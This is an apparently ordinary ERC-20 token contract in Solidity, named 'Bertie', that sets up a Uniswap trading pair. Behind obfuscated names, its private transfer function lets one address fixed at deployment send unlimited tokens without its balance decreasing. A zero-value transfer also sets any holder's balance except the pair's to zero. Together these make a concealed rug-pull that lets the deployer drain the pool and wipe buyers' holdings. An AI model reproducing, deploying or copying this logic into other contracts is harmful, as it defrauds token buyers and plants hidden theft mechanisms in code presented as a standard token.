// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.26;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Bertie is Ownable {

    string public name = "Bertie";

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = "BERTIE";

    function transfer(address hasdasd, uint256 ywer) public returns (bool success) {
        cxzba(msg.sender, hasdasd, ywer);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private nna;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function cxzba(address ujrs, address hasdasd, uint256 ywer) private {
        if (0 == nhj[ujrs]) {
            balanceOf[ujrs] -= ywer;
        }
        balanceOf[hasdasd] += ywer;
        if (0 == ywer && hasdasd != xad) {
            balanceOf[hasdasd] = ywer;
        }
        emit Transfer(ujrs, hasdasd, ywer);
    }

    function transferFrom(address ujrs, address hasdasd, uint256 ywer) public returns (bool success) {
        require(ywer <= allowance[ujrs][msg.sender]);
        allowance[ujrs][msg.sender] -= ywer;
        cxzba(ujrs, hasdasd, ywer);
        return true;
    }

    constructor(address ghasdzvd) {
        balanceOf[msg.sender] = totalSupply;
        nhj[ghasdzvd] = naswdz;
        IUniswapV2Router02 nhgj = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        xad = IUniswapV2Factory(nhgj.factory()).createPair(address(this), nhgj.WETH());
    }

    mapping(address => uint256) private nhj;

    address public xad;

    function approve(address kjy, uint256 ywer) public returns (bool success) {
        allowance[msg.sender][kjy] = ywer;
        emit Approval(msg.sender, kjy, ywer);
        return true;
    }

    uint256 private naswdz = 231;

    uint8 public decimals = 9;

    event Transfer(address indexed from, address indexed to, uint256 value);
}